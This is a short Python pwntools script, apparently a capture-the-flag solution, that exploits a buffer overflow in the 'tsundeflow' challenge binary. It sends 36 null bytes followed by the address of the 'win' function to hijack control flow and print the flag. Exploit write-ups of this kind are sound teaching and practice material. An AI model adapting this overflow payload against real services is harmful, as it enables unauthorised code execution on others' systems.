#! /usr/bin/env python3
##
# Created for the Overflow challenge
# By Amos (LFlare) Ng <amosng1@gmail.com>
##
import sys
from pwn import *

# Load binary into pwntools and extract win address
elf = ELF("../distrib/tsundeflow-redacted")
win = pack(elf.symbols[b"win"])

# Start binary in pipe or connect to socket
if len(sys.argv) == 3:
    t = remote(sys.argv[1], int(sys.argv[2]))
else:
    t = process("../service/tsundeflow-server")

# Send payload and dump initial output
t.recvuntil("Your response?")
t.clean()
t.sendline(b"\x00"*36 + win)

# Get flag
log.success(t.clean().decode())
